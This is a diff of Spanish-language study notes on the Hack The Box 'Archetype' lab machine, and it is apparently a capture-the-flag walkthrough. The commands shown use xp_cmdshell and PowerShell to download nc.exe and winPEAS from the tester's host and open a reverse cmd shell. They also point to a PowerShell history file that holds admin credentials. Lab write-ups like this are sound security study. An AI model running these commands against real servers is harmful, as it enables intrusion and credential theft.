@@ -33,7 +33,7 @@ HACK THE BOX - ARCHETYPE MACHINE
 			-Una vez establecido nuestro Servidor y Listener procedemos con la Reverse Shell Connection desde el servidor SQL
 
 - ifconfig																																	-Verificamos a traves de que dirección IP establecimos nuestro servidor (Comunmente Tun0: 10.10.14.195)
-- xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads\; wget http://10.10.14.195/nc.exe -outfile nc.exe"								-Con el comando nos dirigimos al directorio "Downloads" en el cual y con el comando wget, realizamos una petición al servidor web anteriormente configurado y descargamos el archivo nc.exe
+- xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads\; wget http://10.10.14.195:80/nc.exe -outfile nc.exe"							-Con el comando nos dirigimos al directorio "Downloads" en el cual y con el comando wget, realizamos una petición al servidor web anteriormente configurado y descargamos el archivo nc.exe
 - xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads\; .\nc.exe -e cmd.exe 10.10.14.195 443"											-Con el comando nos dirigimos al directorio donde se encuentra nuestro archivo "nc.exe" y lo ejecutamos (.\nc.exe) con el parametró (-e cmd.exe) que se utiliza para especificar el comando que se ejecutará después de establecer la conexión. Ademas especificamos la dirección IP y puerto a través del cual nos conectaremos.
 
 			-Ahora establecida una RSC, y para poder acceder a la ruta con privilegios, haremos uso del script winPEAS, el cual descargamos desde github y copiamos en el directorio de trabajo y donde se encuentra nuestro servidor web 
@@ -41,7 +41,7 @@ HACK THE BOX - ARCHETYPE MACHINE
 - xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads\; wget http://10.10.14.195/winPEASx64.exe -outfile winPEASx64.exe"					-Con el comando descargamos winPEAS.exe en el directorio ~\Downloads\
 - xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads\; .\winPEASx64.exe -e winPEASx64.exe"												-Con el comando ejectuamos el Script de Winpeas para descubrimiento y escalar privilegios, dentro de los resultados verificamos lo siguiente:
 
-			-����������͹ Analyzing Windows Files Files (limit 70)																				-La salida resaltada en rojo nos da la ruta de un archivo.txt con posibles credenciales de administrador, el cual verificaremos.
+			-Analyzing Windows Files Files (limit 70)																							-La salida resaltada en rojo nos da la ruta de un archivo.txt con posibles credenciales de administrador, el cual verificaremos.
 			-C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 			
 	(Dentro del CMD del Reverse Shell Connection)		
